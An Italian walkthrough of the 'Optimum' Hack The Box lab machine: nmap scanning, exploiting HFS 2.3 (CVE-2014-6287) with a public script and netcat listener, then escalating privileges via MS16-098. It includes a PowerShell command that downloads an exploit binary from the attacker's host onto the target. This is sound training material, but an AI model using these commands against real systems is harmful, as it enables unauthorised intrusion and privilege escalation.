# Optimum

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.8
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.8
Host is up (0.047s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2012|8|Phone|7 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows Embedded Standard 7 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Enumeration
Visito la pagina http://10.10.10.8/:

<p align="center">
  <img src="/Immagini/Windows-Box/optimum/optimum-1.png"/>
</p>

HFS è un semplice programma per la condivisone dei file via HTTP senza installare nessun web server specifico sulla propria macchina.

Facendo una rapida ricerca scopro che la versione di HFS 2.3 è vulnerabile (CVE-2014-6287). La funzione _findMacroMarker_ presente nella libreria _parserLib.pas_ consente agli aggressori di eseguire programmi arbitrari.

## Exploitation
Utilizzo il comando _searchsploit_:

<p align="center">
  <img src="/Immagini/Windows-Box/optimum/optimum-2.png"/>
</p>

Quindi scarico il file _39161.py_. Dopo aver modificato alcuni campi, noto che è necessario mettere in piedi un web server (porta 80) sulla macchina di attacco in una directory che ha il file eseguibile netcat nc.exe.

Successivamente avvio un listener sulla porta specificata all'internod dello script e lancio il programma in pyrhon:

<p align="center">
  <img src="/Immagini/Windows-Box/optimum/optimum-3.png"/>
</p>

**Ottengo cosi il primo flag!**

## Privilege Escalation
Decido di utilizzare per la prima volta nella vita [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) per identificare l'assenza di patch sul target per poter scalare i privilegi.

Per prima cosa scarico lo script:

```text
git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
```

Successivamente, installo le dipendenze e aggiorno il database:

```text
pip install xlrd --upgrade
```

```text
./windows-exploit-suggester.py --update
```

Quindi lancio il comando _systeminfo_ per recuperare le informazioni sulla macchina _Optimum_, ottenendo il seguente risultato:

```text
C:\Users\kostas\Desktop>systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36   
System Boot Time:          20/12/2023, 7:49:25   
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.532 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.728 MB
Virtual Memory: In Use:    775 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed
```

Copio questo output su un file _sysinfo.txt_ nella stessa cartella di Windows Exploit Suggester e lancio il seguente comando:

```text
./windows-exploit-suggester.py --database 2023-12-14-mssb.xls --systeminfo sysinfo.txt
```

Il sitema sembra vulnerabile a molti exploit! Provo con MS16–098. Facendo una ricerca trovo un [eseguibile](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe) che trasferisco sulla macchina _Optimum_ tramite un server http creato con python.

Per trasferirlo utilizzo il seguente comando:

```text
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.8:4444/41020.exe', 'c:\Users\Public\Downloads\41020.exe')"
```

Successivamente, eseguo il binario:

<p align="center">
  <img src="/Immagini/Windows-Box/optimum/optimum-4.png"/>
</p>

**Sono root!**
